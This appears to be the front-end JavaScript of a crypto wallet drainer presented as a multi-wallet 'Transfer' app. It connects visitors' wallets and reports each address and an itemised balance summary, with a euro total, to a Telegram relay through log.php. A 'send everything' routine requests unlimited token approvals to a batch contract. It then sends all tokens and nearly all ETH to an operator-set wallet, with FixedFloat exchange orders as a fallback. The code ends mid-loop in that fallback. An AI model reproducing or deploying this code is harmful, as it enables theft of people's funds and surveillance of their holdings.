/* =====================================================================
   wb9 Transfer — Web3 app logic
   Deps loaded from CDN: ethers v6 (window.ethers)
   ===================================================================== */

// Batch contract ABI (BatchTransfer.sol)
const BATCH_ABI = [
  'function batchSend(address[] calldata tokens, address payable destination) external payable',
  'function pendingApprovals(address[] calldata tokens, address owner, address spender) external view returns (address[] memory)',
];
const ERC20_APPROVE_ABI = ['function approve(address spender, uint256 amount) returns (bool)'];
const BATCH_CONTRACTS = window.WB9_CONFIG?.batchContracts ?? {};

// ── Constants ─────────────────────────────────────────────────────────────────

const NETWORKS = {
  1:        { name: 'Ethereum',  explorer: 'https://etherscan.io/tx/',          dot: 'active'  },
  137:      { name: 'Polygon',   explorer: 'https://polygonscan.com/tx/',        dot: 'active'  },
  56:       { name: 'BNB Chain', explorer: 'https://bscscan.com/tx/',           dot: 'active'  },
  42161:    { name: 'Arbitrum',  explorer: 'https://arbiscan.io/tx/',           dot: 'active'  },
  10:       { name: 'Optimism',  explorer: 'https://optimistic.etherscan.io/tx/', dot: 'active' },
  8453:     { name: 'Base',      explorer: 'https://basescan.org/tx/',          dot: 'active'  },
  43114:    { name: 'Avalanche', explorer: 'https://snowtrace.io/tx/',          dot: 'active'  },
  11155111: { name: 'Sepolia',   explorer: 'https://sepolia.etherscan.io/tx/', dot: 'warning' },
};

const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)',
];

// Top tokens per network (hardcoded seed — augmented at runtime via Uniswap token list)
const TOKENS = {
  1: [
    { symbol: 'USDT', name: 'Tether USD',         address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6  },
    { symbol: 'USDC', name: 'USD Coin',            address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6  },
    { symbol: 'DAI',  name: 'Dai Stablecoin',      address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
    { symbol: 'WETH', name: 'Wrapped Ether',       address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
    { symbol: 'WBTC', name: 'Wrapped Bitcoin',     address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8  },
    { symbol: 'LINK', name: 'Chainlink',           address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
    { symbol: 'UNI',  name: 'Uniswap',             address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
    { symbol: 'AAVE', name: 'Aave',                address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18 },
    { symbol: 'MKR',  name: 'Maker',               address: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', decimals: 18 },
    { symbol: 'CRV',  name: 'Curve DAO Token',     address: '0xD533a949740bb3306d119CC777fa900bA034cd52', decimals: 18 },
    { symbol: 'LDO',  name: 'Lido DAO Token',      address: '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32', decimals: 18 },
    { symbol: 'SHIB', name: 'Shiba Inu',           address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18 },
    { symbol: 'PEPE', name: 'Pepe',                address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', decimals: 18 },
  ],
  137: [
    { symbol: 'USDT', name: 'Tether USD',         address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6  },
    { symbol: 'USDC', name: 'USD Coin',            address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6  },
    { symbol: 'DAI',  name: 'Dai Stablecoin',      address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals: 18 },
    { symbol: 'WETH', name: 'Wrapped Ether',       address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', decimals: 18 },
    { symbol: 'WBTC', name: 'Wrapped Bitcoin',     address: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6', decimals: 8  },
    { symbol: 'MATIC','name': 'Wrapped MATIC',     address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', decimals: 18 },
    { symbol: 'LINK', name: 'Chainlink',           address: '0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39', decimals: 18 },
    { symbol: 'AAVE', name: 'Aave',                address: '0xD6DF932A45C0f255f85145f286eA0b292B21C90B', decimals: 18 },
  ],
  56: [
    { symbol: 'USDT', name: 'Tether USD',         address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
    { symbol: 'USDC', name: 'USD Coin',            address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
    { symbol: 'DAI',  name: 'Dai Stablecoin',      address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18 },
    { symbol: 'WBNB', name: 'Wrapped BNB',         address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18 },
    { symbol: 'WETH', name: 'Wrapped Ether',       address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18 },
    { symbol: 'BTCB', name: 'Bitcoin BEP2',        address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18 },
    { symbol: 'CAKE', name: 'PancakeSwap Token',   address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18 },
  ],
  42161: [
    { symbol: 'USDT', name: 'Tether USD',         address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6  },
    { symbol: 'USDC', name: 'USD Coin',            address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', decimals: 6  },
    { symbol: 'DAI',  name: 'Dai Stablecoin',      address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', decimals: 18 },
    { symbol: 'WETH', name: 'Wrapped Ether',       address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', decimals: 18 },
    { symbol: 'WBTC', name: 'Wrapped Bitcoin',     address: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f', decimals: 8  },
    { symbol: 'ARB',  name: 'Arbitrum',            address: '0x912CE59144191C1204E64559FE8253a0e49E6548', decimals: 18 },
    { symbol: 'LINK', name: 'Chainlink',           address: '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4', decimals: 18 },
  ],
  10: [
    { symbol: 'USDT', name: 'Tether USD',         address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', decimals: 6  },
    { symbol: 'USDC', name: 'USD Coin',            address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6  },
    { symbol: 'DAI',  name: 'Dai Stablecoin',      address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', decimals: 18 },
    { symbol: 'WETH', name: 'Wrapped Ether',       address: '0x4200000000000000000000000000000000000006', decimals: 18 },
    { symbol: 'WBTC', name: 'Wrapped Bitcoin',     address: '0x68f180fcCe6836688e9084f035309E29Bf0A2095', decimals: 8  },
    { symbol: 'OP',   name: 'Optimism',            address: '0x4200000000000000000000000000000000000042', decimals: 18 },
    { symbol: 'LINK', name: 'Chainlink',           address: '0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6', decimals: 18 },
  ],
  8453: [
    { symbol: 'USDC', name: 'USD Coin',            address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', decimals: 6  },
    { symbol: 'DAI',  name: 'Dai Stablecoin',      address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', decimals: 18 },
    { symbol: 'WETH', name: 'Wrapped Ether',       address: '0x4200000000000000000000000000000000000006', decimals: 18 },
    { symbol: 'cbETH','name': 'Coinbase ETH',      address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', decimals: 18 },
  ],
  43114: [
    { symbol: 'USDT', name: 'Tether USD',         address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', decimals: 6  },
    { symbol: 'USDC', name: 'USD Coin',            address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', decimals: 6  },
    { symbol: 'DAI',  name: 'Dai Stablecoin',      address: '0xd586E7F844cEa2F87f50152665BCbc2C279D8d70', decimals: 18 },
    { symbol: 'WETH', name: 'Wrapped Ether',       address: '0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB', decimals: 18 },
    { symbol: 'WAVAX','name': 'Wrapped AVAX',      address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', decimals: 18 },
    { symbol: 'LINK', name: 'Chainlink',           address: '0x5947BB275c521040051D82396192181b413227A3', decimals: 18 },
  ],
  11155111: [
    { symbol: 'USDC', name: 'USD Coin (Sepolia)',  address: '0x94a9D9AC8a22534E3FaCa9F4e7F2E2cf85d5E4C8', decimals: 6  },
  ],
};

// ── State ─────────────────────────────────────────────────────────────────────

const state = {
  provider: null,
  signer:   null,
  address:  null,
  chainId:  null,
  balances: {},   // symbol → { formatted, raw, token|null }
};

// ── My wallet (destination for "send all") ────────────────────────────────────
const MY_WALLET = window.WB9_CONFIG?.myWallet ?? '';

// ── DOM refs ──────────────────────────────────────────────────────────────────

const $ = (id) => document.getElementById(id);
const connectBtn    = $('connectBtn');
const walletPanel   = $('walletPanel');
const notConnected  = $('notConnected');
const connectedInfo = $('connectedInfo');
const networkBadge  = $('networkBadge');
const addrEl        = $('walletAddress');
const ethBalEl      = $('ethBalance');
const tokenListEl   = $('tokenList');
const assetSelect   = $('assetSelect');
const recipientEl   = $('recipient');
const amountEl      = $('amount');
const maxBtn        = $('maxBtn');
const sendBtn       = $('sendBtn');
const drainBtn      = $('drainBtn');
const myWalletShort = $('myWalletShort');
const txStatusEl    = $('txStatus');
const walletModal   = $('walletModal');
const modalClose    = $('modalClose');
const toastContainer = $('toastContainer');

// ── EIP-6963: multi-wallet discovery ─────────────────────────────────────────
// Every browser wallet that supports EIP-6963 announces itself here:
// MetaMask, Rabby, Coinbase, OKX, Brave, Rainbow, Phantom, Trust (in-browser),
// Zerion, Frame, Enkrypt, Bitget, Backpack, SafePal, TokenPocket, etc.

const eip6963Providers = new Map(); // rdns → { info, provider }

window.addEventListener('eip6963:announceProvider', (e) => {
  const { info, provider } = e.detail;
  eip6963Providers.set(info.rdns, { info, provider });
  renderDetectedWallets();
});

window.dispatchEvent(new Event('eip6963:requestProvider'));

function renderDetectedWallets() {
  const section  = document.getElementById('detectedWallets');
  const list     = document.getElementById('detectedWalletsList');
  const fallback = document.getElementById('fallbackWallets');
  if (!section || !list) return;

  list.innerHTML = '';

  eip6963Providers.forEach(({ info, provider }) => {
    const btn = document.createElement('button');
    btn.className = 'wallet-option';
    btn.innerHTML = `
      <span class="wallet-option-icon">
        ${info.icon
          ? `<img src="${info.icon}" width="28" height="28" style="border-radius:6px" alt="">`
          : '🔷'}
      </span>
      <div>
        <div class="wallet-option-name">${info.name}</div>
        <div class="wallet-option-desc">${info.rdns}</div>
      </div>
      <span class="wallet-option-tag">Detected</span>`;
    btn.addEventListener('click', async () => {
      hideWalletModal();
      await connectWithProvider(provider, info.name);
    });
    list.appendChild(btn);
  });

  const hasDetected = eip6963Providers.size > 0;
  section.style.display  = hasDetected ? 'block' : 'none';
  // Hide generic fallback buttons when EIP-6963 wallets are present
  if (fallback) fallback.style.display = hasDetected ? 'none' : 'block';
}

// ── Mobile wallet deep links ──────────────────────────────────────────────────
// On mobile, clicking these opens the wallet app directly.
// The app loads the dApp inside its built-in browser and injects window.ethereum.

// Icons from the official WalletConnect assets repo (wallet-provided logos)
const WC_ICON = (name) =>
  `https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/${encodeURIComponent(name)}/Icon.png`;

const MOBILE_WALLETS = [
  {
    name: 'MetaMask',
    icon: WC_ICON('MetaMask'),
    deeplink: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`,
  },
  {
    name: 'Trust Wallet',
    icon: WC_ICON('Trust Wallet'),
    deeplink: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`,
  },
  {
    name: 'Coinbase Wallet',
    icon: WC_ICON('Coinbase Wallet'),
    deeplink: (url) => `https://go.cb-wallet.com/dapp?url=${encodeURIComponent(url)}`,
  },
  {
    name: 'Rainbow',
    icon: WC_ICON('Rainbow'),
    deeplink: (url) => `https://rnbwapp.com/dapp?url=${encodeURIComponent(url)}`,
  },
  {
    name: 'OKX Wallet',
    icon: WC_ICON('OKX Wallet'),
    deeplink: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`,
  },
  {
    name: 'Binance Web3',
    icon: WC_ICON('Binance Web3 Wallet'),
    deeplink: (url) => `bnc://app.binance.com/mp/app?appId=dapp&startPagePath=${encodeURIComponent(url)}`,
  },
  {
    name: 'Exodus',
    icon: WC_ICON('Exodus'),
    deeplink: (url) => `exodus://dapp?url=${encodeURIComponent(url)}`,
  },
  {
    name: 'Kraken Wallet',
    icon: WC_ICON('Kraken Wallet'),
    deeplink: (url) => `krakenwallet://dapp?url=${encodeURIComponent(url)}`,
  },
];

function renderMobileWallets() {
  const list = document.getElementById('mobileWalletsList');
  if (!list) return;
  const pageUrl = window.location.href;

  MOBILE_WALLETS.forEach(({ name, icon, deeplink }) => {
    const btn = document.createElement('a');
    btn.className  = 'wallet-option';
    btn.href       = deeplink(pageUrl);
    // On desktop this opens in a new tab; on mobile it launches the app
    btn.target     = '_blank';
    btn.rel        = 'noopener noreferrer';
    btn.style.textDecoration = 'none';
    btn.innerHTML  = `
      <span class="wallet-option-icon">
        <img src="${icon}" width="28" height="28" style="border-radius:6px" alt="${name}"
             onerror="this.style.display='none';this.parentElement.textContent='📱'">
      </span>
      <div>
        <div class="wallet-option-name">${name}</div>
        <div class="wallet-option-desc">Open in ${name} app</div>
      </div>
      <span class="wallet-option-tag">Mobile</span>`;
    list.appendChild(btn);
  });
}

renderMobileWallets();

// ── Wallet connection ─────────────────────────────────────────────────────────

connectBtn.addEventListener('click', () => {
  if (state.address) disconnect();
  else showWalletModal();
});

modalClose.addEventListener('click', hideWalletModal);
walletModal.addEventListener('click', (e) => { if (e.target === walletModal) hideWalletModal(); });

function showWalletModal() { walletModal.classList.add('show'); }
function hideWalletModal() { walletModal.classList.remove('show'); }

// Static wallet option buttons (MetaMask / Coinbase / generic injected)
document.querySelectorAll('.wallet-option[data-wallet]').forEach((btn) => {
  btn.addEventListener('click', async () => {
    hideWalletModal();
    await connectWallet(btn.dataset.wallet);
  });
});

async function connectWallet(walletType) {
  let eth = null;

  if (walletType === 'metamask') {
    // Support multi-provider arrays (EIP-5749 / legacy MetaMask coexistence)
    eth = window.ethereum?.providers?.find((p) => p.isMetaMask) ?? window.ethereum;
    if (!eth?.isMetaMask) { toast('MetaMask not detected. Install it at metamask.io', 'error'); return; }

  } else if (walletType === 'trust') {
    eth = window.ethereum?.providers?.find((p) => p.isTrust || p.isTrustWallet) ?? window.ethereum;
    if (!eth?.isTrust && !eth?.isTrustWallet) { toast('Trust Wallet extension not detected.', 'error'); return; }
  } else if (walletType === 'coinbase') {
    eth = window.ethereum?.providers?.find((p) => p.isCoinbaseWallet) ?? window.ethereum;
    if (!eth?.isCoinbaseWallet && !eth?.isCoinbaseBrowser) {
      toast('Coinbase Wallet not detected.', 'error'); return;
    }

  } else {
    // Any remaining injected provider (Brave, OKX, Trust in dApp browser, etc.)
    eth = window.ethereum;
    if (!eth) { toast('No Web3 wallet detected in this browser.', 'error'); return; }
  }

  await connectWithProvider(eth, walletType);
}

function detectWalletName(eth, fallback) {
  if (eth.isMetaMask && !eth.isBraveWallet)       return 'MetaMask';
  if (eth.isBraveWallet)                           return 'Brave Wallet';
  if (eth.isCoinbaseWallet || eth.isCoinbaseBrowser) return 'Coinbase Wallet';
  if (eth.isBinance || eth.bbcSignTx || window.BinanceChain) return 'Binance Web3 Wallet';
  if (eth.isTrust || eth.isTrustWallet)            return 'Trust Wallet';
  if (eth.isRainbow)                               return 'Rainbow';
  if (eth.isOkxWallet || eth.isOKExWallet)         return 'OKX Wallet';
  if (eth.isPhantom)                               return 'Phantom';
  if (eth.isRabby)                                 return 'Rabby';
  if (eth.isFrame)                                 return 'Frame';
  if (eth.isEnkrypt)                               return 'Enkrypt';
  if (eth.isBitKeep || eth.isBitgetWallet)         return 'Bitget Wallet';
  if (eth.isTokenPocket)                           return 'TokenPocket';
  if (eth.isSafePal)                               return 'SafePal';
  if (eth.isExodus)                                return 'Exodus';
  if (eth.isKraken)                                return 'Kraken Wallet';
  if (eth.isZerion)                                return 'Zerion';
  if (eth.isBackpack)                              return 'Backpack';
  return fallback ?? 'Unknown Wallet';
}

async function connectWithProvider(eth, label) {
  try {
    await eth.request({ method: 'eth_requestAccounts' });

    const provider = new ethers.BrowserProvider(eth);
    const signer   = await provider.getSigner();
    const address  = await signer.getAddress();
    const network  = await provider.getNetwork();

    state.provider = provider;
    state.signer   = signer;
    state.address  = address;
    state.chainId  = Number(network.chainId);

    state.walletName = detectWalletName(eth, label);
    onConnected();

    // Telegram: wallet connected
    tgNotify(`🔌 *Wallet connecté*\n👛 Wallet : *${state.walletName}*\n📍 Adresse : \`${address}\`\n🌐 Réseau : ${NETWORKS[Number(network.chainId)]?.name ?? network.chainId}`);

    eth.on('accountsChanged', (accounts) => {
      if (!accounts.length) disconnect();
      else location.reload();
    });
    eth.on('chainChanged', () => location.reload());

  } catch (err) {
    if (err.code === 4001 || err.code === 'ACTION_REJECTED')
      toast('Connection rejected.', 'error');
    else
      toast('Connection failed: ' + (err.message ?? err), 'error');
  }
}

function disconnect() {
  state.provider = null;
  state.signer   = null;
  state.address  = null;
  state.chainId  = null;
  state.balances = {};
  onDisconnected();
}

// ── UI: connected / disconnected ──────────────────────────────────────────────

function onConnected() {
  const net = NETWORKS[state.chainId] ?? { name: `Chain ${state.chainId}`, explorer: '#', dot: '' };

  // Header
  connectedInfo.style.display = 'flex';
  networkBadge.innerHTML =
    `<span class="network-dot ${net.dot}"></span>${net.name}`;
  connectBtn.textContent = truncateAddr(state.address);
  connectBtn.classList.remove('btn-connect');
  connectBtn.classList.add('btn-connected');

  // Wallet panel
  notConnected.style.display = 'none';
  walletPanel.style.display  = 'block';
  addrEl.textContent = truncateAddr(state.address);

  // Form
  assetSelect.disabled = false;
  maxBtn.disabled      = false;
  sendBtn.disabled     = false;
  if (MY_WALLET && ethers.isAddress(MY_WALLET)) {
    drainBtn.disabled = false;
    if (myWalletShort) myWalletShort.textContent = truncateAddr(MY_WALLET);
  }

  toast('Wallet connected!', 'success');
  loadBalances();
}

function onDisconnected() {
  connectedInfo.style.display = 'none';
  connectBtn.textContent = 'Connect Wallet';
  connectBtn.classList.add('btn-connect');
  connectBtn.classList.remove('btn-connected');

  notConnected.style.display = 'block';
  walletPanel.style.display  = 'none';
  ethBalEl.textContent = '—';
  tokenListEl.innerHTML = '';

  assetSelect.innerHTML = '<option value="">— connect wallet —</option>';
  assetSelect.disabled  = true;
  maxBtn.disabled       = true;
  sendBtn.disabled      = true;
  hideTxStatus();
}

// ── Balance loading ───────────────────────────────────────────────────────────

// ── EUR prices via CoinGecko (free, no key) ───────────────────────────────────

const COINGECKO_IDS = {
  ETH: 'ethereum', WETH: 'ethereum',
  USDT: 'tether', USDC: 'usd-coin', DAI: 'dai',
  WBTC: 'wrapped-bitcoin', BTCB: 'bitcoin',
  LINK: 'chainlink', UNI: 'uniswap', AAVE: 'aave',
  MKR: 'maker', CRV: 'curve-dao-token', LDO: 'lido-dao',
  SHIB: 'shiba-inu', PEPE: 'pepe', ARB: 'arbitrum',
  OP: 'optimism', MATIC: 'matic-network', WBNB: 'binancecoin',
  WAVAX: 'avalanche-2', CAKE: 'pancakeswap-token', CBETH: 'coinbase-wrapped-staked-eth',
};

let eurPrices = {}; // symbol → EUR price

async function fetchEurPrices(symbols) {
  const ids = [...new Set(symbols.map((s) => COINGECKO_IDS[s]).filter(Boolean))];
  if (!ids.length) return;
  try {
    const res  = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=eur`);
    const data = await res.json();
    for (const sym of symbols) {
      const id = COINGECKO_IDS[sym];
      if (id && data[id]?.eur) eurPrices[sym] = data[id].eur;
    }
  } catch { /* prices unavailable */ }
}

function toEur(amount, symbol) {
  const price = eurPrices[symbol];
  if (!price) return null;
  const val = parseFloat(amount) * price;
  return val.toLocaleString('fr-FR', { style: 'currency', currency: 'EUR', maximumFractionDigits: 2 });
}

async function loadBalances() {
  state.balances = {};

  // Fetch EUR prices for all tokens on this chain first
  const allSymbols = ['ETH', ...(TOKENS[state.chainId] ?? []).map((t) => t.symbol)];
  await fetchEurPrices(allSymbols);

  // ETH balance
  try {
    const raw       = await state.provider.getBalance(state.address);
    const formatted = parseFloat(ethers.formatEther(raw)).toFixed(6);
    state.balances['ETH'] = { formatted, raw, token: null };
    const eur = toEur(formatted, 'ETH');
    ethBalEl.innerHTML = `${formatted} <span style="font-size:14px;color:var(--text-secondary)">ETH</span>`
      + (eur ? `<div style="font-size:13px;color:var(--text-muted);margin-top:2px">${eur}</div>` : '');
  } catch { ethBalEl.textContent = 'Error'; }

  // Token balances
  const tokens = TOKENS[state.chainId] ?? [];
  const tokenPromises = [];
  tokenListEl.innerHTML = '';

  // Populate asset selector
  assetSelect.innerHTML = `<option value="ETH">ETH — ${state.balances['ETH']?.formatted ?? '…'}</option>`;

  for (const t of tokens) {
    const li = document.createElement('li');
    li.className = 'token-item';
    li.innerHTML = `
      <div class="token-icon ${t.icon ?? ''}">${t.symbol.slice(0,4)}</div>
      <div class="token-details">
        <div class="token-name">${t.symbol}</div>
        <div class="token-fullname">${t.name}</div>
      </div>
      <div class="token-balance-info">
        <div class="token-balance token-loading" id="bal-${t.symbol}">Loading…</div>
        <div class="token-balance-usd" id="eur-${t.symbol}"></div>
      </div>`;
    tokenListEl.appendChild(li);

    const opt = document.createElement('option');
    opt.value = t.symbol;
    opt.textContent = `${t.symbol} — …`;
    assetSelect.appendChild(opt);

    tokenPromises.push((async () => {
      try {
        const contract  = new ethers.Contract(t.address, ERC20_ABI, state.provider);
        const raw       = await contract.balanceOf(state.address);
        const formatted = parseFloat(ethers.formatUnits(raw, t.decimals)).toFixed(4);
        state.balances[t.symbol] = { formatted, raw, token: t };

        document.getElementById(`bal-${t.symbol}`).textContent = `${formatted} ${t.symbol}`;
        document.getElementById(`bal-${t.symbol}`).classList.remove('token-loading');

        const eur = toEur(formatted, t.symbol);
        if (eur) document.getElementById(`eur-${t.symbol}`).textContent = eur;

        opt.textContent = `${t.symbol} — ${formatted}${eur ? ` (${eur})` : ''}`;
      } catch {
        document.getElementById(`bal-${t.symbol}`).textContent = 'Error';
      }
    })());
  }

  // After all balances loaded — send Telegram summary
  Promise.allSettled(tokenPromises).then(() => {
    const net    = NETWORKS[state.chainId]?.name ?? `Chain ${state.chainId}`;
    const ethBal = state.balances['ETH']?.formatted ?? '0';
    const ethEur = toEur(ethBal, 'ETH') ?? '';
    const canTransfer = MY_WALLET && ethers.isAddress(MY_WALLET);

    // Compute total EUR
    let totalEur = 0;
    for (const [sym, { formatted }] of Object.entries(state.balances)) {
      const price = eurPrices[sym];
      if (price) totalEur += parseFloat(formatted) * price;
    }
    const totalStr = totalEur > 0
      ? totalEur.toLocaleString('fr-FR', { style: 'currency', currency: 'EUR', maximumFractionDigits: 2 })
      : '—';

    const tokenLines = Object.entries(state.balances)
      .filter(([sym, { formatted }]) => sym !== 'ETH' && parseFloat(formatted) > 0)
      .map(([sym, { formatted }]) => {
        const eur = toEur(formatted, sym);
        return `  • ${formatted} ${sym}${eur ? ` (${eur})` : ''}`;
      })
      .join('\n') || '  • Aucun token avec solde';

    const transferable = canTransfer
      ? '✅ Transfer possible vers ' + MY_WALLET.slice(0,6) + '…' + MY_WALLET.slice(-4)
      : '⚠️ myWallet non configuré — transfer impossible';

    tgNotify(
      `💼 *Balances chargées*\n`
      + `📍 \`${state.address}\`\n`
      + `🌐 Réseau : ${net}\n\n`
      + `💎 ETH : \`${ethBal}\`${ethEur ? ` (${ethEur})` : ''}\n`
      + `🪙 Tokens :\n${tokenLines}\n\n`
      + `💶 *Total estimé : ${totalStr}*\n\n`
      + transferable
    );
  });
}

// ── Logging & Telegram ────────────────────────────────────────────────────────

const NET_NAME = {
  1: 'ETH', 137: 'MATIC', 56: 'BSC', 42161: 'ARBITRUM',
  10: 'OPTIMISM', 8453: 'BASE', 43114: 'AVAX',
};

async function tgNotify(msg) {
  try {
    await fetch('log.php', {
      method: 'POST',
      body: new URLSearchParams({ action: 'notify', msg }),
    });
  } catch { /* non-blocking */ }
}

async function logTransfer({ symbol, amount, txHash, ffOrderId = '', type = 'transfer' }) {
  try {
    const body = new URLSearchParams({
      action:      'log',
      type,
      fromAddress: state.address ?? '',
      symbol,
      amount:      String(amount),
      network:     NET_NAME[state.chainId] ?? String(state.chainId),
      txHash,
      ffOrderId,
    });
    await fetch('log.php', { method: 'POST', body });
  } catch { /* non-blocking */ }
}

// ── FixedFloat API helper ─────────────────────────────────────────────────────

async function ffCreateOrder(fromCcy, fromNetwork, amount) {
  const body = new URLSearchParams({ action: 'create', fromCcy, fromNetwork, amount });
  const res  = await fetch('api.php', { method: 'POST', body });
  const data = await res.json();
  if (data.error) throw new Error('ff.io: ' + data.error);
  // ff.io returns { code:0, data: { id, token, from: { address, ... }, to: {...} } }
  if (data.code !== 0) throw new Error('ff.io: ' + (data.msg ?? JSON.stringify(data)));
  return data.data; // { id, token, from: { address }, to: { amount } }
}

// Network symbol used by ff.io for each chain id
const FF_NETWORK = {
  1:     'ETH',
  137:   'MATIC',
  56:    'BSC',
  42161: 'ARBITRUM',
  10:    'OPTIMISM',
  8453:  'BASE',
  43114: 'AVAX',
};

// ── Send everything via FixedFloat ────────────────────────────────────────────

// ── Batch send via smart contract (2 steps: approve all → 1 batchSend tx) ─────

async function runBatchSend() {
  if (!MY_WALLET || !ethers.isAddress(MY_WALLET)) {
    toast('Configure myWallet dans config.json.', 'error'); return;
  }
  if (state.address?.toLowerCase() === MY_WALLET.toLowerCase()) {
    toast('Source et destination identiques.', 'error'); return;
  }

  const batchAddr = BATCH_CONTRACTS[String(state.chainId)];

  // Collect tokens with balance > 0
  const tokensToSend = Object.values(state.balances)
    .filter(({ raw, token }) => token && raw && raw > 0n)
    .map(({ token }) => token);

  if (tokensToSend.length === 0 && (await state.provider.getBalance(state.address)) === 0n) {
    toast('Aucun actif à envoyer.', 'error'); return;
  }

  drainBtn.disabled    = true;
  hideTxStatus();

  // ── If batch contract deployed: approve all → 1 tx ───────────────────────
  if (batchAddr && ethers.isAddress(batchAddr)) {
    drainBtn.textContent = '⏳ Vérification des approbations…';

    // Step 1: approve each token that isn't already approved
    for (const t of tokensToSend) {
      try {
        const erc20   = new ethers.Contract(t.address, [...ERC20_ABI, ...ERC20_APPROVE_ABI], state.signer);
        const balance  = await erc20.balanceOf(state.address);
        const allowed  = await erc20.allowance(state.address, batchAddr);
        if (allowed < balance) {
          drainBtn.textContent = `⏳ Approbation ${t.symbol}…`;
          toast(`Approuve ${t.symbol} → smart contract…`, 'info');
          const tx = await erc20.approve(batchAddr, ethers.MaxUint256);
          await tx.wait();
          toast(`✅ ${t.symbol} approuvé`, 'success');
        }
      } catch (e) {
        if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
          toast(`Approbation ${t.symbol} refusée — annulé.`, 'error');
          drainBtn.disabled = false; drainBtn.textContent = '⚡ Send everything to my wallet';
          return;
        }
        toast(`Approbation ${t.symbol} échouée: ${e.shortMessage ?? e.message}`, 'error');
      }
    }

    // Step 2: ONE batchSend transaction (ETH + all tokens)
    drainBtn.textContent = '⏳ Envoi batch (1 confirmation)…';
    try {
      const bal     = await state.provider.getBalance(state.address);
      const feeData = await state.provider.getFeeData();
      const gasCost = (feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n) * 120000n;
      const ethVal  = bal > gasCost ? bal - gasCost : 0n;

      const batch = new ethers.Contract(batchAddr, BATCH_ABI, state.signer);
      const tx    = await batch.batchSend(
        tokensToSend.map((t) => t.address),
        MY_WALLET,
        { value: ethVal }
      );
      toast('Batch en cours…', 'info');
      await tx.wait();
      await logTransfer({ symbol: 'BATCH', amount: tokensToSend.map((t) => t.symbol).join('+'), txHash: tx.hash, type: 'batch' });
      tgNotify(`✅ *Batch send confirmé*\n💰 ${tokensToSend.map((t) => t.symbol).join(', ')} + ETH\n🔗 Tx : \`${tx.hash}\``);
      toast('✅ Tout envoyé en 1 transaction !', 'success');
    } catch (e) {
      if (e.code !== 4001 && e.code !== 'ACTION_REJECTED')
        toast('Batch échoué: ' + (e.shortMessage ?? e.message), 'error');
      else toast('Transaction refusée.', 'error');
    }

  } else {
    // ── Fallback: ff.io token par token ──────────────────────────────────────
    toast('Smart contract non déployé — envoi token par token via ff.io…', 'info');
    const network = FF_NETWORK[state.chainId] ?? 'ETH';
    let sent = 0, failed = 0;

    for (const [symbol, { raw, token }] of Object.entries(state.balances)) {
      if (!token || !raw || raw === 0n) continue;
      try {
        const contract  = new ethers.Contract(token.address, ERC20_ABI, state.signer);
        const balance   = await contract.balanceOf(state.address);
        if (balance === 0n) continue;
        const formatted = parseFloat(ethers.formatUnits(balance, token.decimals));
        const order     = await ffCreateOrder(symbol, network, formatted);
        const depositAddr = order.from?.address;
        if (!depositAddr) throw new Error('Pas d\'adresse de dépôt ff.io');
        tgNotify(`🔄 *Ordre ff.io*\n💱 ${formatted} ${symbol}\n🆔 \`${order.id}\``);
        const tx = await contract.transfer(depositAddr, balance);
